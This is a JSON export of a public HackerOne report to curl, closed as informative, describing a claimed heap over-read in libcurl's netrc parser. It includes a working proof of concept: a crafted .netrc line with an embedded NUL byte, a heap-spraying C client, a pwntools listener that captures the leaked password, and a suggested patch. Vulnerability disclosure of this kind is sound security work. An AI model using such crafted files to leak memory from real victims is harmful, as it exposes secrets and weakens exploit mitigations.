{
  "id": 3211126,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMjExMTI2",
  "url": "https://hackerone.com/reports/3211126",
  "title": "Sensitive information disclosure with malicious netrc file",
  "state": "Closed",
  "substate": "informative",
  "severity_rating": "medium",
  "readable_substate": "Informative",
  "created_at": "2025-06-19T18:54:26.213Z",
  "submitted_at": "2025-06-19T18:54:26.613Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "z2_",
    "url": "/z2_",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/5eld4c9eg34za1r92ipvd757pa9d/36bca6668139d77be42208d896968344ae7a76c55ee0f8b0f28281ccd492ff02"
    },
    "is_me?": false,
    "cleared": false,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 35663,
    "url": "https://hackerone.com/curl",
    "handle": "curl",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/36bca6668139d77be42208d896968344ae7a76c55ee0f8b0f28281ccd492ff02",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/19c85a12ac35f466af1ea2b0ae853bfe5e8f057fb1d6fb62db131707bb67b30d"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "curl",
      "twitter_handle": "",
      "website": "https://curl.se",
      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
    }
  },
  "has_bounty?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2025-06-22T10:55:55.644Z",
  "bug_reporter_agreed_on_going_public_at": "2025-06-21T22:47:03.741Z",
  "team_member_agreed_on_going_public_at": "2025-06-22T10:55:55.403Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "libcurl at commit [879b6075a1132c137920060ed262b3f5a58c18c2](https://github.com/curl/curl/tree/879b6075a1132c137920060ed262b3f5a58c18c2) contains a vulnerability where it can be coerced into reading over the boundaries of a heap-chunk and sending the resulting data over the\nnetwork to an attacker. This can lead to a disclosure of sensitive data, including pointers or other secret data on the heap.\n\nThe vulnerability exists in `lib/netrc.c` in the function `parsenetrc()` and has to do with the handling of the variables `tok` and `tok_end`:\n```c\n    const char *tok = netrcbuffer;\n    while(tok && !done) {\n      const char *tok_end;\n    \n      // [...]\n      \n      tok_end = tok;\n      if(!quoted) {\n        size_t len = 0;\n        CURLcode result;\n        while(*tok_end > ' ') {\n          tok_end++;\n          len++;\n        }\n        \n        // [...]\n      }\n      \n      // [...]\n      \n      tok = ++tok_end;\n    }\n```\n`tok` and `tok_end` point to the individual tokens inside a line of the .netrc file. However, if a token ends with a `\\x00` character, the loop reads past the NUL-terminator and continues parsing random heap-data following the line. Take the following line as an example:\n```\nmachine 127.0.0.1 login username password\\x00 nothing-suspicious-here\n```\nWhen the parser arrives at `password\\x00`, it treats the `\\x00` as a token separator and `tok_end` points to that byte, but then gets incremented at the end of the loop in `++tok_end`. The following loop iteration continues parsing the data that follows the NUL-terminated string.\n\n# PoC\nThis bug can lead to a disclosure of memory contents, as demonstrated by the following PoC:\n\nConsider the following .netrc file generated by this bash script:\n```sh\n$ echo -en 'machine 127.0.0.1 login username password\\x00 nothing-suspicious-here\\n' > poc.txt\n```\n\nAnd, consider the following libcurl client that uses this netrc file to make a connection:\n```c\n#include <stdlib.h>\n#include \"curl/curl.h\"\n\nint main (int argc, char** argv) {\n    /* Pre-populate the heap with exemplary data */\n    char* spray = malloc(32 * 1024);\n    for (int i = 0; i < 32 * 1024; ++i) {\n        spray[i] = 'A';\n    }\n    free(spray);\n    \n    /* Start transfer */\n    CURL* curl = curl_easy_init();\n    curl_easy_setopt(curl, CURLOPT_URL, \"ftp://127.0.0.1:1337/\");\n    curl_easy_setopt(curl, CURLOPT_NETRC, CURL_NETRC_REQUIRED);\n    curl_easy_setopt(curl, CURLOPT_NETRC_FILE, \"./poc.txt\");\n    curl_easy_perform(curl);\n    curl_easy_cleanup(curl);\n}\n```\n\nThen, if we launch a small demo server that justs prints the transmitted password...\n```py\n#!/usr/bin/env python3\n\nfrom pwn import *\n\nwith listen(1337) as conn:\n    conn.wait_for_connection()\n    \n    conn.sendline(b\"220 Hello\\r\")\n    \n    line = conn.recvline()\n    assert(line == b'USER username\\r\\n')\n    conn.sendline(b\"331 continue\\r\")\n    \n    line = conn.recvline()\n    print(line)\n```\n\n... we can observe the following output\n\n```\n$ python3 server.py\nb'PASS AAAAAAAAAAAAAA\\r\\n'\n```\n\nThis means that uninitialized memory content has been sent instead of the supplied password `nothing-suspicious-here`.\n\n# Exploit Scenario\nThis bug represents a vulnerability in a scenario, where a victim gets supplied with a malicious .netrc file by an attacker. When the victim makes a connection to the malicious host using the .netrc file, secret memory contents are transmitted to the attacker, with potentially previous heap-grooming to control what data gets transmitted.\n\n# Patch\nThe following patch tries to fix the bug by limiting the allowed characters for `tok_end` to whitespaces:\n```diff\ndiff --git a/lib/netrc.c b/lib/netrc.c\nindex 7df3f17fc..2f80df36c 100644\n--- a/lib/netrc.c\n+++ b/lib/netrc.c\n@@ -165,7 +165,7 @@ static NETRCcode parsenetrc(struct store_netrc *store,\n           tok_end++;\n           len++;\n         }\n-        if(!len) {\n+        if(!len || (*tok_end != ' ' && *tok_end != '\\n' && *tok_end != '\\r')) {\n           retcode = NETRC_SYNTAX_ERROR;\n           goto out;\n         }\n```\n\n# Impact\n\nLeaking memory contents can help with exploiting other memory corruptions in order to achieve RCE if it used to leak pointer values. This can defeat exploit mitigations like [ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization) and [PIE](https://en.wikipedia.org/wiki/Position-independent_code). Alternatively it can be used to leak secrets that were previously used by the application and allocated on the heap.\n\nSince the vulnerability is easy to trigger with the single NUL byte, is difficult to spot for the victim since `\\x00` is not printable and the resulting sensitive data gets sent over the network to the attacker, I suggest severity Medium.",
  "weakness": {
    "id": 1600,
    "name": "LLM06: Sensitive Information Disclosure"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 34,
  "voters": [
    "z2_",
    "2026",
    "mohaned0101",
    "thalaivar304",
    "alvin7l",
    "m1ght-guy",
    "athanas",
    "0xouasmih",
    "myuserhack999",
    "druier",
    "and 24 more..."
  ],
  "severity": {
    "rating": "medium",
    "author_type": "User"
  },
  "structured_scope": {
    "databaseId": 18844,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "https://github.com/curl/curl",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
